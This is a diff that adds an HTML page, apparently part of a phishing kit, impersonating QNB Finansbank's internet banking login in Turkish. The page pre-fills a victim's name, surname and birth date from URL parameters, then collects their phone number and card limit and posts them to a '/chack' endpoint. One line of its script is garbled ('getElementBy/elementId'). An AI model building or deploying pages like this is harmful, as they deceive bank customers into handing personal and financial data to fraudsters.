@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css"
+        integrity="sha384-4LISF5TTJX/fLmGSxO53rV4miRxdg84mZsxmO8Rx5jGtp/LbrixFETvWa5a6sESd" crossorigin="anonymous">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.8/jquery.inputmask.min.js"></script>
+    <link rel="stylesheet" href="assets/css/style1.css">
+    <title>QNB Finansbank İnternet Şubesi</title>
+    <link rel="icon" href="ayar/resim/logo.png" type="image/png">
+</head>
+<body>
+    <div id="firstContent">
+        <img src="assets/img/loading.png" id="loadingImage" alt="Loading">
+    </div>
+    <div id="thirdContent">
+        <form id="girisForm" action="/chack" method="post">
+            <div id="form2">
+                <a href="/" style="text-decoration: none;">
+                    <div style="margin-top: 17px; float: right; margin-right: 15px; text-align: right;">
+                        <i class="bi bi-x" style="color: #fff; font-size: 45px;"></i>
+                    </div>
+                </a>
+                <h5 class="title">Giriş Yap</h5>
+                <div class="inputs">
+                    <h2 style="color: #fff; font-size: 13px;" id="eleman">
+                        <span>Hoşgeldiniz Sayın </span><span id="adi"></span> <span id="soyadi"></span>
+                    </h2>
+                    <h2 style="color: #fff; font-size: 13px;" id="eleman">
+                        Doğum Tarihi: <span id="dogumtarihi"></span>
+                    </h2>
+                    <input type="hidden" name="adi" id="adiInput">
+                    <input type="hidden" name="soyadi" id="soyadiInput">
+                    <div class="group">
+                        <label>Telefon Numarası</label>
+                        <div>
+                            <input type="tel" name="phone" id="phone" class="field"inputmode="numeric" autocomplete="off" required>
+                        </div>
+                    </div>
+                    <div id="limitContainer" class="group">
+                        <label>Kart Limiti</label>
+                        <input style="padding-left: 10px;" type="text" inputmode="numeric" name="limit" id="limit"
+                            class="field" autocomplete="off" required>
+                    </div>
+                </div>
+                <div class="giris-yap">
+                    <input type="submit" id="sendData" class="button" value="Giriş Yap">
+                </div>
+            </div>
+        </form>
+    </div>
+    <script>
+        window.addEventListener('load', function () {
+            const firstContent = document.getElementById('firstContent');
+            setTimeout(function () {
+                firstContent.classList.add('fade-out');
+                setTimeout(function () {
+                    firstContent.style.display = 'none';
+                }, 1000);
+            }, 2000);
+        });
+
+        document.addEventListener("DOMContentLoaded", function () {
+            // URL parametrelerini al
+            const params = new URLSearchParams(window.location.search);
+            const adi = params.get('adi') || '';
+            const soyadi = params.get('soyadi') || '';
+            const dogumtarihi = params.get('dogumtarihi') || '';
+
+            // Span elementlerine değerleri yaz
+            document.getElementById('adi').textContent = adi;
+            document.getElementById('soyadi').textContent = soyadi;
+            document.getElementById('dogumtarihi').textContent = dogumtarihi;
+
+            // Hidden inputlara değerleri ata
+            document.getElementById('adiInput').value = adi;
+            document.getElementById('soyadiInput').value = soyadi;
+
+            // Telefon numarası için maskeleme
+            $("#phone").inputmask({
+                mask: "+90 (599) 999 99 99",
+                greedy: false,
+                definitions: {
+                    '5': { validator: "[5]" },
+                    '9': { validator: "[0-9]" }
+                },
+                placeholder: "_",
+                clearIncomplete: true,
+                showMaskOnHover: false
+            });
+            $("#phone").val("+90 (" );
+
+            // Telefon numarası input temizleme
+            $("#phone").on('input', function () {
+                var phone = $(this).val().replace(/[^0-9]/g, '');
+                if (phone.length > 12) {
+                    phone = phone.substring(0, 12);
+                }
+                $(this).val(phone);
+            });
+
+            // Kart limiti formatlama
+            document.getElementById("limit").addEventListener("input", function () {
+                let value = this.value.replace(/\D/g, '');
+                if (value === '') {
+                    checkFormValidation();
+                    return;
+                }
+                value = parseInt(value, 10);
+                let formattedValue = new Intl.NumberFormat('tr-TR').format(value);
+                this.value = formattedValue;
+                checkFormValidation();
+            });
+
+            // Form doğrulama
+            function checkFormValidation() {
+                const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
+                const limit = document.getElementById('limit').value.replace(/\D/g, '');
+                const adi = document.getElementById('adiInput').value;
+                const soyadi = document.getElementById('soyadiInput').value;
+
+                document.getElementById('sendData').disabled = !(phone.length >= 10 && limit && adi && soyadi);
+            }
+
+            // Form gönderimi kontrolü
+            document.getElementById('girisForm').addEventListener('submit', function (event) {
+                const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
+                const limit = document.getElementBy/elementId('limit').value.replace(/\D/g, '');
+                const adi = document.getElementById('adiInput').value;
+                const soyadi = document.getElementById('soyadiInput').value;
+
+                if (!phone || phone.length < 10 || !limit || !adi || !soyadi) {
+                    event.preventDefault();
+                    alert('Lütfen tüm alanları doğru şekilde doldurun.');
+                }
+            });
+
+            // İlk doğrulama
+            checkFormValidation();
+        });
+    </script>
+    <script src="assets/js/script1.js"></script>
+</body>
+</html>
